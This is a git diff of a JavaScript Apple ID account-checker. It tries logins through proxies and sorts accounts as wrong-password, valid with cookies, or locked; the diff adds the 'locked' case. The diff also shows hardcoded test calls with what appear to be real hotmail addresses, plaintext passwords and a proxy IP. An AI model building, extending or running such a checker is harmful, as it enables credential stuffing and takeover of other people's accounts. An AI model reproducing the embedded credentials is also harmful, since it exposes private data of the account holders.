@@ -114,6 +114,8 @@ const loginIdApple = (proxy, proof) => {
           resolve("sai pass")
         } else if (error?.response?.status == 412) {
           resolve({ cookies: error?.response?.headers['set-cookie'], headers: error?.response?.headers })
+        } else if(error?.response?.status == 403) {
+          resolve('locked')
         } else {
           resolve(false)
         }
@@ -417,7 +419,7 @@ const CHBMAppleID = (email, pass, proxyString) => {
                   pass: pass,
                   proxy: proxyString,
                   status: 'checked',
-                  note: 'CHBM'
+                  note: 'custom'
                 })
               }
             } else {
@@ -428,8 +430,7 @@ const CHBMAppleID = (email, pass, proxyString) => {
               mail: email,
               pass: pass,
               proxy: proxyString,
-              status: 'checked',
-              note: 'locked'
+              status: 'not checked'
             })
           }
         }
@@ -452,10 +453,10 @@ const CHBMAppleID = (email, pass, proxyString) => {
   })
 }
 
-(async () => {
-  let a = await CHBMAppleID("gentry_phillps@hotmail.com", "7UFcfEdD865@", "38.174.39.200:3128");
-  console.log(a);
-})()
+// (async () => {
+//   let a = await CHBMAppleID("pamuk_maco@hotmail.com", "tL0FWeaClh7@", "38.174.39.200:3128");
+//   console.log(a);
+// })()
 
 module.exports = {
   CHBMAppleID
